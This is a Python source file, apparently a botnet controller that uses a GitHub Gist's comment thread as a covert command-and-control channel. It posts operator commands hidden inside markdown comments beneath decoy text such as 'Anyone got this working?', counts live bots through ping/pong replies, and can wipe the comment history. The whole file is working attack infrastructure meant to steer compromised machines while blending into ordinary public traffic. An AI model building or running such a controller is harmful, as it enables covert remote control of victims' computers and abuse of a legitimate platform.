#! /bin/python3
import argparse
from datetime import datetime
import sys
import threading
import time
import requests
from dotenv import dotenv_values
from utils import create_markdown_comment, get_random_message, parse_markdown_comment

parser = argparse.ArgumentParser(
    prog='controller.py',
    description='Bot controller script, connect to given gist channel and send commands'
)

try:
    github_token = dotenv_values(".env")['GITHUB_TOKEN']
except KeyError:
    github_token = None

parser.add_argument('gistId', help="Github gist id")
parser.add_argument(
    '-t', '--token', help='Github personal access token, required if not specified in .env file', required=github_token is None)
parser.add_argument('-d', '--delete', help="Delete all comments",
                    action='store_true')

args = parser.parse_args()

if(github_token is None):
    github_token = args.token

gist_id = args.gistId
gist_url = f'https://api.github.com/gists/{gist_id}'
comments_url = f'{gist_url}/comments'

headers = {"authorization": f'bearer {github_token}'}
gist_response = requests.get(gist_url, headers=headers)
gist = gist_response.json()
state = {"last_update": gist['updated_at'],
         "bot_count": 'checking...'}

try:
    print(f"Channel url: {gist['url']}")
except KeyError:
    print(f'Failed tof fetch gist: {gist_response}')
    exit()


def get_comments(latest_only=False):
    comments = requests.get(comments_url, headers=headers).json()
    if latest_only:
        comments = list(filter(
            lambda comment: comment['updated_at'] > state['last_update'], comments))
    return comments


def print_comments(latest_only=False, commands_only=False):
    comments = get_comments(latest_only=latest_only)

    comment_cards = map(lambda comment: f"""
    {comment['updated_at']}: {comment['user']['login']}[{comment['user']['id']}]> "{parse_markdown_comment(comment['body']) if commands_only else comment['body']}" """, comments)

    for card in comment_cards:
        print(card)


def post_comment(message, silent=False):
    response = requests.post(
        comments_url, json={"body": message}, headers=headers)
    state["last_update"] = response.json()['updated_at']
    if not silent:
        print(response)
    return response


def update_comment(comment_id, message, silent=False):
    response = requests.patch(
        f'{comments_url}/{comment_id}', json={"body": message}, headers=headers)
    if not silent:
        print(response)
    return response


def delete_comment(comment_id: str):
    return requests.delete(
        f'{comments_url}/{comment_id}', headers=headers)


def prompt(message="$ "):
    sys.stdout.write(message)
    sys.stdout.flush()
    return sys.stdin.readline().strip()


def ping_bots():
    def get_message():
        return f"{get_random_message(['Anyone got this working?','Is this up to date?'])}\n\n<!-- {datetime.now()} -->\n\n{create_markdown_comment('ping')}"

    ping_comment = post_comment(
        get_message(), silent=True).json()

    while True:
        time.sleep(8)
        comments = get_comments()
        comments = filter(
            lambda comment: comment['updated_at'] > ping_comment['updated_at'], comments)
        commands = map(lambda comment: (
            parse_markdown_comment(comment['body'])), comments)
        bot_count = len(
            list(filter(lambda command: command == 'pong', list(commands))))
        state['bot_count'] = bot_count
        ping_comment = update_comment(
            comment_id=ping_comment['id'], message=get_message(), silent=True).json()


if args.delete:
    comments = get_comments()
    for comment in comments:
        print(f"deleting {comment['id']}")
        response = delete_comment(comment['id'])
        print(response)

bot_check_thread = threading.Thread(
    target=ping_bots, daemon=True)
bot_check_thread.start()

while True:
    command = prompt(f"[bots: {state['bot_count']}] $ ")
    match command:
        case 'comments':
            print('> fetching comments')
            print_comments()
        case 'commands':
            print('> fetching commands')
            print_comments(commands_only=True)

        case 'latest':
            print('> fetching latest commands')
            print_comments(latest_only=True, commands_only=True)

        case 'post':
            comment = prompt("> Write comment: ")
            command = prompt("> Submit command: ")
            post_comment(f'{comment}\n\n{create_markdown_comment(command)}')
        case 'bots':
            print(f'> bot count: {state["bot_count"]}')
        case 'exit':
            break
        case other:
            print('> Unknown command: ' + command)
